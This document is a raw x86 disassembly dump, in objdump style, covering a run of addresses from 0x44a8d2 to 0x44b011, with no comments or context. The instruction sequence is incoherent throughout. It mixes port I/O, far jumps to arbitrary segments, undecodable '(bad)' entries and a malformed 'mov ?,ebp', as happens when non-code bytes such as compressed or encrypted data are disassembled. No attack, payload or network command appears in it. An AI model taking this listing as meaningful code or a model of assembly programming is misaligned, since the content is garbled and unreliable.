  44a8d2:	xchg   ebp,eax
  44a8d3:	gs ret 0x22e3
  44a8d7:	jmp    0xc92569aa
  44a8dc:	div    DWORD PTR [ecx]
  44a8de:	test   dl,ah
  44a8e0:	dec    ecx
  44a8e1:	pop    bp
  44a8e3:	pop    ebx
  44a8e4:	std    
  44a8e5:	inc    esp
  44a8e6:	dec    edx
  44a8e7:	stos   DWORD PTR es:[edi],eax
  44a8e8:	daa    
  44a8e9:	aad    0x7f
  44a8eb:	setnp  ch
  44a8ee:	xor    edi,0x35b5d5d7
  44a8f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a8f5:	mov    BYTE PTR [eax-0x7c36b59f],ch
  44a8fb:	lods   eax,DWORD PTR ds:[esi]
  44a8fc:	adc    dh,BYTE PTR ds:0x850e2d88
  44a902:	clc    
  44a903:	mov    dh,0xfb
  44a905:	sbb    ecx,DWORD PTR [ebp-0x66]
  44a908:	mov    al,0x18
  44a90a:	fwait
  44a90b:	jge    0x44a983
  44a90d:	push   edi
  44a90e:	push   cs
  44a90f:	mov    ecx,fs
  44a911:	mov    edi,0x6550affd
  44a916:	int    0xe5
  44a918:	arpl   WORD PTR [esi],dx
  44a91a:	cmp    edx,DWORD PTR [esi-0x1308a7a4]
  44a920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a921:	cs gs xbegin 0x546f5091
  44a929:	inc    ebp
  44a92a:	in     al,dx
  44a92b:	sub    eax,0x5cf00e09
  44a930:	in     eax,dx
  44a931:	xchg   edx,eax
  44a932:	fmul   DWORD PTR [ebx-0x3d]
  44a935:	mov    ds:0xe5a49922,eax
  44a93a:	out    dx,eax
  44a93b:	fwait
  44a93c:	rcl    DWORD PTR [edi],1
  44a93e:	enter  0xb7cf,0x13
  44a942:	mov    edx,0xe466d260
  44a947:	jo     0x44a911
  44a949:	sahf   
  44a94a:	das    
  44a94b:	jno    0x44a9a8
  44a94d:	inc    esi
  44a94e:	test   al,0xd2
  44a950:	or     DWORD PTR [edx-0x7d],0xffffffa5
  44a954:	add    DWORD PTR [ebx-0x6209cb4e],edx
  44a95a:	ja     0x44a932
  44a95c:	pop    esp
  44a95d:	cld    
  44a95e:	pop    edi
  44a95f:	xchg   edi,eax
  44a960:	jmp    0x44a988
  44a962:	lea    eax,[eax-0x202702b5]
  44a968:	or     al,BYTE PTR [edi+edx*1-0x79]
  44a96c:	aam    0x90
  44a96e:	js     0x44a94e
  44a970:	nop
  44a971:	dec    edi
  44a972:	mov    BYTE PTR [ebp+0x39],dl
  44a975:	dec    ebp
  44a976:	xor    DWORD PTR [edx+0x53b5b8e0],edi
  44a97c:	mov    bh,0x5c
  44a97e:	cdq    
  44a97f:	sbb    eax,0xaaec416a
  44a984:	and    al,0x21
  44a986:	adc    edi,DWORD PTR [ebx+0x42b7da87]
  44a98c:	pop    ds
  44a98d:	add    al,0x57
  44a98f:	out    dx,eax
  44a990:	imul   esi,ebp,0xffffff9d
  44a993:	xor    edi,edi
  44a995:	pop    es
  44a996:	dec    esp
  44a997:	es mov cl,0xf6
  44a99a:	jmp    0x4f06:0x59753e92
  44a9a1:	jmp    0x5f0a:0xd46ddb2f
  44a9a8:	mov    edx,0x15241327
  44a9ad:	jl     0x44a97e
  44a9af:	or     BYTE PTR [esi+0x6ff18d61],bl
  44a9b5:	scas   al,BYTE PTR es:[edi]
  44a9b6:	ret    0x6b1a
  44a9b9:	xchg   edi,eax
  44a9ba:	jmp    0x1f4bd6e8
  44a9bf:	fldcw  WORD PTR [ebp+0xd61faf0]
  44a9c5:	loope  0x44a9e6
  44a9c7:	aas    
  44a9c8:	sbb    eax,0x8348432
  44a9cd:	xor    al,0x40
  44a9cf:	sbb    al,BYTE PTR [ebx]
  44a9d1:	xor    esi,edx
  44a9d3:	stos   BYTE PTR es:[edi],al
  44a9d4:	in     al,0x7a
  44a9d6:	sub    bh,BYTE PTR [ebx+0x4be9702d]
  44a9dc:	repnz dec esi
  44a9de:	imul   edi,DWORD PTR [eax],0xc3c67a82
  44a9e4:	lods   al,BYTE PTR ds:[esi]
  44a9e5:	cli    
  44a9e6:	ret    0xdaaa
  44a9e9:	enter  0x5727,0x6a
  44a9ed:	mov    ch,0x96
  44a9ef:	xlat   BYTE PTR ds:[ebx]
  44a9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a9f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a9f2:	hlt    
  44a9f3:	push   ds
  44a9f4:	xor    bl,BYTE PTR [edi+0x7a9389c4]
  44a9fa:	cdq    
  44a9fb:	out    dx,eax
  44a9fc:	stc    
  44a9fd:	call   0xa27cae7a
  44aa02:	mov    ebp,0xa38058c8
  44aa07:	mov    eax,0xcda14f0b
  44aa0c:	shr    BYTE PTR [eax-0x1299a590],1
  44aa12:	leave  
  44aa13:	call   0xd089bb0f
  44aa18:	cmp    BYTE PTR [edi],ah
  44aa1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44aa1b:	(bad)  
  44aa1c:	cmp    eax,0x84e265e4
  44aa21:	fs inc ebx
  44aa23:	or     DWORD PTR [ebp-0x35],ecx
  44aa26:	xchg   esp,eax
  44aa27:	fsub   st,st(7)
  44aa29:	stos   DWORD PTR es:[edi],eax
  44aa2a:	je     0x44aa24
  44aa2c:	(bad)  [esi]
  44aa2e:	shl    BYTE PTR [esi+0x55],cl
  44aa31:	jbe    0x44a9c4
  44aa33:	jmp    0x3354:0x76ebeccb
  44aa3a:	je     0x44aa28
  44aa3c:	inc    esp
  44aa3d:	ja     0x44aa7c
  44aa3f:	mov    cl,0x1f
  44aa41:	jge    0x44aa5e
  44aa43:	push   es
  44aa44:	stc    
  44aa45:	sub    eax,0x81ede311
  44aa4a:	(bad)  
  44aa4b:	xchg   esp,eax
  44aa4c:	popa   
  44aa4d:	xlat   BYTE PTR ds:[ebx]
  44aa4e:	imul   ecx,edx,0x9
  44aa51:	test   bl,dh
  44aa53:	mov    bh,0x38
  44aa55:	push   cs
  44aa56:	dec    ebp
  44aa57:	jmp    0x44aaa3
  44aa59:	ret    
  44aa5a:	dec    edx
  44aa5b:	or     esi,eax
  44aa5d:	int3   
  44aa5e:	xlat   BYTE PTR ds:[ebx]
  44aa5f:	push   ecx
  44aa60:	aaa    
  44aa61:	xlat   BYTE PTR ds:[ebx]
  44aa62:	jl     0x44aacf
  44aa64:	mov    WORD PTR [ebx-0x44c97331],es
  44aa6a:	pop    edx
  44aa6b:	jmp    0xf9a0:0x337aad37
  44aa72:	or     DWORD PTR [edi],ecx
  44aa74:	sub    eax,0xf2cec3b4
  44aa79:	test   BYTE PTR [eax+0x11],dl
  44aa7c:	push   edi
  44aa7d:	(bad)  
  44aa7e:	outs   dx,BYTE PTR ds:[esi]
  44aa7f:	fadd   QWORD PTR [esp+esi*1-0x35]
  44aa83:	data16 out dx,al
  44aa85:	cmp    ebp,DWORD PTR [eax+eiz*8+0x422cdf48]
  44aa8c:	xchg   esp,eax
  44aa8d:	sbb    ch,al
  44aa8f:	cmp    edi,esp
  44aa91:	dec    DWORD PTR [eax]
  44aa93:	ins    BYTE PTR es:[edi],dx
  44aa94:	mov    BYTE PTR [esi+0x62],0x37
  44aa98:	stos   BYTE PTR es:[edi],al
  44aa99:	test   DWORD PTR ds:0xa51dceca,esp
  44aa9f:	ret    0x18d9
  44aaa2:	mov    ds:0xd7e28e13,eax
  44aaa7:	das    
  44aaa8:	aad    0x89
  44aaaa:	mov    edx,DWORD PTR [edi]
  44aaac:	jg     0x44aab9
  44aaae:	pop    eax
  44aaaf:	mov    dl,0xee
  44aab1:	adc    ebp,edx
  44aab3:	aas    
  44aab4:	jmp    0xbf7229fd
  44aab9:	ja     0x44aa3e
  44aabb:	mov    ecx,0x96e123dd
  44aac0:	call   0xf5a4:0xedff7f66
  44aac7:	pop    ebp
  44aac8:	or     ebp,ecx
  44aaca:	repnz std 
  44aacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44aacd:	inc    edx
  44aace:	or     al,0x84
  44aad0:	mov    esp,0xa23e71d9
  44aad5:	add    BYTE PTR [esi-0x27dd28fb],al
  44aadb:	add    esi,DWORD PTR [eax]
  44aadd:	aas    
  44aade:	inc    edx
  44aadf:	add    al,0xbb
  44aae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44aae2:	inc    eax
  44aae3:	xchg   esp,eax
  44aae4:	cdq    
  44aae5:	shl    BYTE PTR [ebp+0x1],0x4f
  44aae9:	popf   
  44aaea:	adc    al,0xc4
  44aaec:	cmp    al,0x16
  44aaee:	pop    ds
  44aaef:	xor    al,0x6
  44aaf1:	les    edx,FWORD PTR [edi+0x27]
  44aaf4:	daa    
  44aaf5:	pop    ebx
  44aaf7:	imul   ecx,edx,0xd46c1465
  44aafd:	cmp    bh,BYTE PTR [eax+0xd]
  44ab00:	or     al,0x76
  44ab02:	je     0x44ab64
  44ab04:	pushf  
  44ab05:	jp     0x44ab2e
  44ab07:	fcomp  DWORD PTR [ecx+ebx*2]
  44ab0a:	mov    eax,0x7db02836
  44ab0f:	shl    DWORD PTR [ebx+0x4801ec5b],0x47
  44ab16:	aam    0x82
  44ab18:	mov    ch,0x78
  44ab1a:	nop
  44ab1b:	sbb    ecx,edx
  44ab1d:	cmp    BYTE PTR [ebx],al
  44ab1f:	repz mov cl,0xb2
  44ab22:	inc    edi
  44ab23:	xchg   esp,eax
  44ab24:	shl    bl,1
  44ab26:	loop   0x44ab39
  44ab28:	xchg   ecx,eax
  44ab29:	xchg   esi,eax
  44ab2a:	mov    eax,esp
  44ab2c:	or     eax,0x2f52b6cd
  44ab31:	jle    0x44aba3
  44ab33:	jge    0x44aad9
  44ab35:	pop    ss
  44ab36:	out    dx,al
  44ab37:	adc    eax,0xff54edf3
  44ab3c:	dec    ebp
  44ab3d:	dec    edx
  44ab3e:	retf   
  44ab3f:	lds    edx,FWORD PTR [esi]
  44ab41:	inc    ecx
  44ab42:	push   ds
  44ab43:	cdq    
  44ab44:	mov    al,0xc5
  44ab46:	cli    
  44ab47:	ret    
  44ab48:	pop    edx
  44ab49:	push   ecx
  44ab4a:	fcmovbe st,st(7)
  44ab4c:	test   esi,0xec691302
  44ab52:	lods   al,BYTE PTR ds:[esi]
  44ab53:	dec    edi
  44ab54:	dec    edx
  44ab55:	pop    edx
  44ab56:	push   ebp
  44ab57:	mov    bh,0x6a
  44ab59:	or     DWORD PTR [ebp+0x13a63b65],ebx
  44ab5f:	mov    ch,0x60
  44ab61:	mov    eax,ds:0x76292eaf
  44ab66:	xor    al,0x56
  44ab68:	sub    al,0xd4
  44ab6a:	outs   dx,DWORD PTR ds:[esi]
  44ab6b:	lds    edi,FWORD PTR gs:[edi+edi*1-0x7c301302]
  44ab73:	mov    esp,0x89b15b9f
  44ab78:	xor    al,0x10
  44ab7a:	xor    eax,DWORD PTR ds:0x9148f52
  44ab80:	(bad)  
  44ab81:	xchg   esp,eax
  44ab82:	rol    BYTE PTR [eax],1
  44ab84:	add    ah,ch
  44ab86:	mov    eax,ds:0x34d1f81
  44ab8b:	mov    ch,0xdc
  44ab8d:	cmc    
  44ab8e:	push   ds
  44ab8f:	push   eax
  44ab90:	xor    esi,edi
  44ab92:	popf   
  44ab93:	mov    edi,0x43012ee3
  44ab98:	addr16 cs cli 
  44ab9b:	push   ebp
  44ab9c:	jnp    0x44ab45
  44ab9e:	in     eax,0xb5
  44aba0:	das    
  44aba1:	or     dh,BYTE PTR [edi+edx*2]
  44aba4:	xchg   esp,eax
  44aba5:	jge    0x44ac10
  44aba7:	jl     0x44abe5
  44aba9:	(bad)  
  44abaa:	mov    ecx,ebp
  44abac:	shr    DWORD PTR [edx+0x91b14f6],1
  44abb2:	in     al,dx
  44abb3:	xor    DWORD PTR [ecx-0x9],esp
  44abb6:	add    eax,esp
  44abb8:	dec    esp
  44abb9:	mov    ebx,0x29eb26c4
  44abbe:	and    BYTE PTR [ebx],dh
  44abc0:	inc    esp
  44abc1:	in     al,dx
  44abc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44abc3:	or     al,0x6f
  44abc5:	push   eax
  44abc6:	pop    ebx
  44abc7:	mov    BYTE PTR [esi+0x8],ch
  44abca:	sub    ecx,0x82f8e64
  44abd0:	dec    edx
  44abd1:	inc    eax
  44abd2:	mov    ebx,0xd6d4e51a
  44abd7:	mov    ds:0x21352f7b,eax
  44abdc:	jne    0x44ac02
  44abde:	mov    esp,0x661d06fa
  44abe3:	jo     0x44ab67
  44abe5:	push   ebp
  44abe6:	scas   al,BYTE PTR es:[edi]
  44abe7:	add    cl,0x8a
  44abea:	ins    BYTE PTR es:[edi],dx
  44abeb:	inc    edi
  44abec:	aad    0xb7
  44abee:	enter  0x2f48,0x13
  44abf2:	jns    0x44aba5
  44abf4:	adc    al,0x9c
  44abf6:	mov    ds:0x916047ec,al
  44abfb:	xor    cl,ah
  44abfd:	mov    BYTE PTR [ebx],bh
  44abff:	test   al,bh
  44ac01:	mov    eax,ds:0xcb45fa13
  44ac06:	jle    0x44abb6
  44ac08:	rcr    ecx,1
  44ac0a:	mov    dl,0xe8
  44ac0c:	ins    BYTE PTR es:[edi],dx
  44ac0d:	ds pop ds
  44ac0f:	lods   al,BYTE PTR ds:[esi]
  44ac10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ac11:	aam    0x9
  44ac13:	jo     0x44ab9a
  44ac15:	jnp    0x44ac7a
  44ac17:	popa   
  44ac18:	sbb    BYTE PTR [edx-0xb3095b8],0x51
  44ac1f:	pop    ds
  44ac20:	sar    DWORD PTR ds:0x60f6a8ff,0xf9
  44ac27:	(bad)  
  44ac28:	mov    esp,0x74f72903
  44ac2d:	xchg   esp,eax
  44ac2e:	popa   
  44ac2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ac30:	dec    edi
  44ac31:	imul   ebp,ecx,0x30d82073
  44ac37:	fstp   TBYTE PTR [edi-0x1a]
  44ac3a:	dec    edi
  44ac3b:	fnstenv [ecx]
  44ac3d:	xchg   edi,eax
  44ac3e:	mov    WORD PTR [edx],ss
  44ac40:	lock sti 
  44ac42:	sub    al,0x27
  44ac44:	mov    al,0xbc
  44ac46:	test   al,0xb5
  44ac48:	push   edi
  44ac49:	jle    0x44ac43
  44ac4b:	imul   ecx,DWORD PTR [ecx],0x41
  44ac4e:	bndstx [ebx+0x4c],bnd2
  44ac52:	sahf   
  44ac53:	repz fcom st(4)
  44ac56:	out    0x69,al
  44ac58:	dec    ebp
  44ac59:	pop    ds
  44ac5a:	ficomp DWORD PTR [ebx+0x66]
  44ac5d:	sbb    eax,0xcc6ca7f9
  44ac62:	dec    ecx
  44ac63:	adc    DWORD PTR [edx+0x2b84352b],ebp
  44ac69:	jo     0x44acc9
  44ac6b:	leave  
  44ac6c:	fwait
  44ac6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ac6e:	jg     0x44acec
  44ac70:	rcl    BYTE PTR [ebp-0x16],cl
  44ac73:	push   edi
  44ac74:	adc    BYTE PTR [edx-0x1a],ch
  44ac77:	je     0x44ac1c
  44ac79:	rcr    bh,cl
  44ac7b:	aad    0xb8
  44ac7d:	and    bl,ah
  44ac7f:	sub    ch,dl
  44ac81:	lahf   
  44ac82:	xor    ah,al
  44ac84:	pusha  
  44ac85:	rcr    DWORD PTR [ebx+0x1a4215e0],1
  44ac8b:	out    0x9,al
  44ac8d:	shl    BYTE PTR ds:0xfea7f693,0x3b
  44ac94:	loop   0x44ac89
  44ac96:	mov    edi,0x3059bca1
  44ac9b:	push   eax
  44ac9c:	push   eax
  44ac9d:	xor    esi,DWORD PTR [esi]
  44ac9f:	mov    dh,0xa5
  44aca1:	push   ss
  44aca2:	jmp    0x44ac27
  44aca4:	mov    ebp,0xa2e41593
  44aca9:	sar    esp,cl
  44acab:	shl    DWORD PTR [ebp+eax*1-0x4b],1
  44acaf:	add    al,dh
  44acb1:	sbb    ecx,DWORD PTR [eax]
  44acb3:	dec    esi
  44acb4:	jg     0x44ac51
  44acb6:	sahf   
  44acb7:	outs   dx,DWORD PTR ds:[esi]
  44acb8:	dec    ecx
  44acb9:	jne    0x44acc3
  44acbb:	push   ss
  44acbc:	or     al,0x22
  44acbe:	nop
  44acbf:	cmp    DWORD PTR [esi-0x1634773],esi
  44acc5:	mov    ?,ebp
  44acc7:	aas    
  44acc8:	mov    ah,0x70
  44acca:	inc    esi
  44accb:	cmc    
  44accc:	out    dx,eax
  44accd:	aas    
  44acce:	add    ah,dh
  44acd0:	(bad)  
  44acd2:	sbb    al,0xb4
  44acd4:	std    
  44acd5:	add    al,BYTE PTR [ebp+0x54]
  44acd8:	jmp    0x8efed0f6
  44acdd:	push   ecx
  44acde:	push   ebx
  44acdf:	mov    dl,0xdf
  44ace1:	aad    0xd4
  44ace3:	ss dec edi
  44ace5:	dec    edi
  44ace6:	adc    eax,0x503eaa2e
  44aceb:	loope  0x44acbe
  44aced:	mov    ds:0x53fac491,eax
  44acf2:	inc    ebp
  44acf3:	in     al,0xb6
  44acf5:	or     ecx,DWORD PTR fs:[edi+0x53]
  44acf9:	(bad)  [edx+0x37]
  44acfc:	mov    ch,0x10
  44acfe:	(bad)  
  44acff:	ret    0xf6f6
  44ad02:	xor    DWORD PTR [edx+0x44],0xffffffed
  44ad06:	inc    edi
  44ad07:	aas    
  44ad08:	lock add al,0xd
  44ad0b:	fucomip st,st(2)
  44ad0d:	and    al,0x37
  44ad0f:	sub    DWORD PTR [edi+0x409da33f],esp
  44ad15:	dec    esi
  44ad16:	(bad)  
  44ad17:	or     al,0xfb
  44ad19:	add    DWORD PTR [edi],ebp
  44ad1b:	ret    
  44ad1c:	js     0x44ad31
  44ad1e:	out    0x7b,eax
  44ad20:	aam    0xd0
  44ad22:	clc    
  44ad23:	inc    eax
  44ad24:	add    DWORD PTR [ebp+0x23],edi
  44ad27:	mov    ds:0xb5754086,eax
  44ad2c:	and    DWORD PTR [ecx],esp
  44ad2e:	shl    DWORD PTR [edx-0x31d67fb],1
  44ad34:	sub    DWORD PTR [eax],ebp
  44ad36:	mov    eax,0xc20d7114
  44ad3b:	dec    ecx
  44ad3c:	jae    0x44ad8a
  44ad3e:	shl    BYTE PTR [edi],1
  44ad40:	xlat   BYTE PTR ds:[ebx]
  44ad41:	dec    ecx
  44ad42:	mov    ch,dh
  44ad44:	push   edi
  44ad45:	std    
  44ad46:	rcr    DWORD PTR [ecx-0x24],0x1
  44ad4a:	lods   al,BYTE PTR ds:[esi]
  44ad4b:	inc    esp
  44ad4c:	mov    al,0xd1
  44ad4e:	dec    ecx
  44ad4f:	jmp    0x44ada2
  44ad51:	js     0x44ad43
  44ad53:	test   BYTE PTR [ecx+0x12],cl
  44ad56:	loopne 0x44ad28
  44ad58:	push   ebp
  44ad59:	xor    al,0xb0
  44ad5b:	lds    esp,FWORD PTR [ecx+0x5325c12]
  44ad61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ad62:	(bad)  
  44ad63:	jb     0x44acf2
  44ad65:	test   al,0x37
  44ad67:	dec    esi
  44ad68:	fs sub ecx,esp
  44ad6b:	or     eax,esi
  44ad6d:	jmp    0x44ad99
  44ad6f:	test   eax,0x2e6e9124
  44ad74:	sbb    ah,al
  44ad76:	std    
  44ad77:	ins    DWORD PTR es:[edi],dx
  44ad78:	fst    QWORD PTR [bx+si+0xf]
  44ad7c:	push   ebp
  44ad7d:	sbb    dh,ah
  44ad7f:	adc    BYTE PTR [esi+0x63],bl
  44ad82:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ad84:	inc    ecx
  44ad85:	dec    DWORD PTR [eax+0x15]
  44ad88:	xchg   edx,eax
  44ad89:	cli    
  44ad8a:	jb     0x44adac
  44ad8c:	(bad)  [ecx+0x76]
  44ad8f:	inc    ebx
  44ad90:	ins    DWORD PTR es:[edi],dx
  44ad91:	sti    
  44ad92:	fisub  WORD PTR [ebx+0x9]
  44ad95:	push   edi
  44ad96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ad97:	shr    DWORD PTR [ebx-0x6],0x2a
  44ad9b:	and    al,BYTE PTR [edi-0x1199e7c3]
  44ada1:	in     al,0xbe
  44ada3:	xor    ecx,ebx
  44ada5:	or     al,0xb7
  44ada7:	pop    es
  44ada8:	jmp    0x9a2:0x497fac87
  44adaf:	add    BYTE PTR [edx],0x57
  44adb2:	dec    ecx
  44adb3:	js     0x44ad84
  44adb5:	aad    0x5b
  44adb7:	cmp    ecx,DWORD PTR [esi+0x292927db]
  44adbd:	mov    esi,0xc1cf641a
  44adc2:	cmp    DWORD PTR [eax],ecx
  44adc4:	retf   0x79d5
  44adc7:	adc    eax,esi
  44adc9:	loopne 0x44adc5
  44adcb:	stc    
  44adcc:	adc    BYTE PTR [eax+0x57],dl
  44adcf:	jne    0x44adcb
  44add1:	imul   edi,DWORD PTR [eax],0xad2a7e92
  44add7:	ss leave 
  44add9:	repz popa 
  44addb:	and    eax,0xcfe53d11
  44ade0:	cdq    
  44ade1:	jp     0x44ae58
  44ade3:	test   bl,al
  44ade5:	sti    
  44ade6:	pop    ebx
  44ade7:	test   DWORD PTR cs:[ebp-0x6],eax
  44adeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44adec:	in     eax,0x4
  44adee:	add    DWORD PTR [edi-0x72],ecx
  44adf1:	rcl    esp,1
  44adf3:	jae    0x44adb3
  44adf5:	cmp    esp,DWORD PTR [esi+edx*1-0x3359941d]
  44adfc:	rcl    DWORD PTR [esi+edx*2-0x389f9ab2],1
  44ae03:	dec    ebx
  44ae04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44ae05:	loopne 0x44ae67
  44ae07:	push   ds
  44ae08:	inc    ecx
  44ae09:	(bad)
  44ae0c:	jne    0x44ad93
  44ae0e:	lods   al,BYTE PTR ds:[esi]
  44ae0f:	enter  0x19,0x35
  44ae13:	pusha  
  44ae14:	push   0x61
  44ae16:	out    0x71,al
  44ae18:	es test eax,0xa8000809
  44ae1e:	sbb    ecx,DWORD PTR [esi]
  44ae20:	push   0xfd9ac075
  44ae25:	inc    esi
  44ae26:	test   DWORD PTR [edx+0x7ae8627],ecx
  44ae2c:	mov    edx,0xe14daa76
  44ae31:	mov    DWORD PTR [ebx],ebx
  44ae33:	or     ebp,DWORD PTR [ebp+eiz*2+0x72]
  44ae37:	dec    esi
  44ae38:	sub    al,BYTE PTR [edi]
  44ae3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ae3b:	sub    edi,DWORD PTR ds:0x709e922
  44ae41:	jle    0x44aec0
  44ae43:	dec    edi
  44ae44:	nop
  44ae45:	sub    eax,0x23fee98c
  44ae4a:	aas    
  44ae4b:	enter  0x6a3c,0x39
  44ae4f:	shl    ebx,cl
  44ae51:	mov    edx,0xc0029e8e
  44ae56:	pop    edi
  44ae57:	mov    ebx,0x83972799
  44ae5c:	push   esi
  44ae5d:	ret    
  44ae5e:	(bad)  
  44ae60:	popf   
  44ae61:	dec    ebx
  44ae62:	js     0x44aeba
  44ae64:	sub    bl,bl
  44ae66:	dec    ecx
  44ae67:	xchg   edi,eax
  44ae68:	call   0x1dcd:0x313248bf
  44ae6f:	mov    ds:0x143ec230,eax
  44ae74:	(bad)  
  44ae75:	cmc    
  44ae76:	loope  0x44ae2d
  44ae78:	inc    ebp
  44ae79:	je     0x44ae00
  44ae7b:	mov    cl,0x90
  44ae7d:	lock daa 
  44ae7f:	pop    ecx
  44ae80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ae81:	jg     0x44ae5a
  44ae83:	jp     0x44aec5
  44ae85:	fwait
  44ae86:	push   0x8bd8a193
  44ae8b:	pop    ss
  44ae8c:	int3   
  44ae8d:	xchg   ebp,eax
  44ae8e:	pop    es
  44ae8f:	int3   
  44ae90:	lea    esi,[ebp-0x7f12d7ce]
  44ae96:	pop    ebx
  44ae97:	push   edi
  44ae98:	dec    edx
  44ae99:	mov    edx,0xe24e8945
  44ae9e:	mov    edi,DWORD PTR [esi+eiz*4]
  44aea1:	ret    0x22af
  44aea4:	enter  0xcf31,0x48
  44aea8:	mov    cl,0x9
  44aeaa:	xchg   bh,ch
  44aeac:	out    dx,eax
  44aead:	ret    0xa1ca
  44aeb0:	arpl   WORD PTR [eax],dx
  44aeb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44aeb3:	cdq    
  44aeb4:	aas    
  44aeb5:	adc    eax,edi
  44aeb7:	lds    esp,FWORD PTR [eax]
  44aeb9:	outs   dx,BYTE PTR ds:[esi]
  44aeba:	cld    
  44aebb:	push   ss
  44aebc:	jmp    0x7d666546
  44aec1:	(bad)  [ecx-0x53]
  44aec4:	arpl   di,cx
  44aec6:	inc    eax
  44aec7:	adc    bl,ah
  44aec9:	or     al,0xf4
  44aecb:	jne    0x44aeaa
  44aecd:	mov    dl,0xd2
  44aecf:	push   eax
  44aed0:	out    dx,al
  44aed1:	dec    edi
  44aed2:	mov    bl,0x19
  44aed4:	out    dx,al
  44aed5:	loopne 0x44af2e
  44aed7:	mov    ah,0xa
  44aed9:	push   ds
  44aeda:	xlat   BYTE PTR ds:[ebx]
  44aedb:	xor    esi,0xffffffb1
  44aede:	mov    BYTE PTR [ebx],bl
  44aee0:	icebp  
  44aee1:	xchg   esp,eax
  44aee2:	mov    dl,0xcd
  44aee4:	mov    al,0x22
  44aee6:	xchg   ecx,eax
  44aee7:	cmp    ecx,eax
  44aee9:	fcom   DWORD PTR [esp+edi*8+0x39093067]
  44aef0:	push   esi
  44aef1:	adc    eax,edi
  44aef3:	xchg   edx,eax
  44aef4:	push   esp
  44aef5:	sbb    BYTE PTR [ebx+0x6544dc88],dh
  44aefb:	mov    DWORD PTR [ebx+ecx*2-0x20041aca],eax
  44af02:	pop    esi
  44af03:	outs   dx,DWORD PTR ds:[esi]
  44af04:	stc    
  44af05:	cdq    
  44af06:	cdq    
  44af07:	push   cs
  44af08:	ja     0x44af5b
  44af0a:	shl    dh,1
  44af0c:	xchg   DWORD PTR [ebx+0x42860775],edx
  44af12:	jns    0x44af7d
  44af14:	test   BYTE PTR ds:[edi-0x78],al
  44af18:	jmp    0xb347:0xf105bc91
  44af1f:	push   cs
  44af20:	adc    edi,edi
  44af22:	sbb    eax,0xb42b2d78
  44af27:	pop    ebp
  44af28:	popa   
  44af29:	mov    dh,0x33
  44af2b:	sbb    ebp,DWORD PTR [ebx+0x38]
  44af2e:	stc    
  44af2f:	ins    BYTE PTR es:[edi],dx
  44af30:	ins    BYTE PTR es:[edi],dx
  44af31:	in     eax,0x1c
  44af33:	ja     0x44aede
  44af35:	retf   
  44af36:	int    0x8e
  44af38:	mov    bh,0xed
  44af3a:	cmp    eax,0x5607d260
  44af3f:	xchg   edx,eax
  44af40:	push   DWORD PTR [eax+0x8]
  44af43:	add    eax,0x5dd2baba
  44af48:	mov    bl,0xdd
  44af4a:	adc    eax,0x1d0ad3ad
  44af4f:	mov    dh,BYTE PTR ds:0xc0080e3c
  44af55:	jnp    0x44aeff
  44af57:	dec    eax
  44af58:	mov    ds:0xb649e87a,eax
  44af5d:	push   ds
  44af5e:	and    DWORD PTR [ecx+0x1],ebx
  44af61:	aam    0xc6
  44af63:	cmp    BYTE PTR [esi-0x51],al
  44af66:	sbb    ebx,DWORD PTR [ebx+0x34be1b00]
  44af6c:	pop    ebp
  44af6d:	mov    ebp,0xaf236a88
  44af72:	into   
  44af73:	js     0x44af77
  44af75:	inc    ebx
  44af76:	aam    0xd6
  44af78:	cmp    bh,bl
  44af7a:	cli    
  44af7b:	imul   edi,DWORD PTR [edx+edx*1-0x4b],0xb7bfa25a
  44af83:	pop    esi
  44af84:	xor    al,BYTE PTR [ebx-0x5e5776a1]
  44af8a:	dec    ecx
  44af8b:	and    al,0xdd
  44af8d:	fcom   QWORD PTR [esi+0x650498bf]
  44af93:	repnz shl BYTE PTR [edi+edi*1+0x2b95ebed],1
  44af9b:	clc    
  44af9c:	add    eax,0x1970f61c
  44afa1:	pusha  
  44afa2:	push   esi
  44afa3:	call   0x10f4:0x9d1b691a
  44afaa:	fs mov eax,0x5efe17c9
  44afb0:	daa    
  44afb1:	inc    esp
  44afb2:	out    dx,eax
  44afb3:	sbb    edi,DWORD PTR [ecx+0x26]
  44afb6:	cmp    eax,DWORD PTR [edi+0x20]
  44afb9:	push   edx
  44afba:	test   al,0xf8
  44afbc:	sub    BYTE PTR ss:[ebx+0x55f9a6f4],0x8d
  44afc4:	addr16 mov edi,0xe4c7431b
  44afca:	mov    al,0x9
  44afcc:	iret   
  44afcd:	jmp    0x5b837dbd
  44afd2:	mov    ds:0xc4031817,al
  44afd7:	or     al,0x8f
  44afd9:	jnp    0x44afe3
  44afdb:	bound  ebp,QWORD PTR [ebx]
  44afdd:	(bad)  
  44afe0:	icebp  
  44afe1:	je     0x44aff5
  44afe3:	push   0x2b1bb5cd
  44afe8:	xchg   DWORD PTR ds:0xb67c19e7,esi
  44afee:	add    DWORD PTR [ebx+eax*4],esi
  44aff1:	xchg   esi,eax
  44aff2:	out    dx,eax
  44aff3:	sahf   
  44aff4:	or     eax,0x95e10454
  44aff9:	in     eax,0x3e
  44affb:	xlat   BYTE PTR ds:[ebx]
  44affc:	je     0x44affb
  44affe:	pop    ecx
  44afff:	push   edx
  44b000:	out    0x81,eax
  44b002:	ret    0x2132
  44b005:	scas   eax,DWORD PTR es:[edi]
  44b006:	stos   BYTE PTR es:[edi],al
  44b007:	add    ecx,DWORD PTR [ebp+0x20]
  44b00a:	call   0x3f23:0x992730d1
  44b011:	in     al,dx
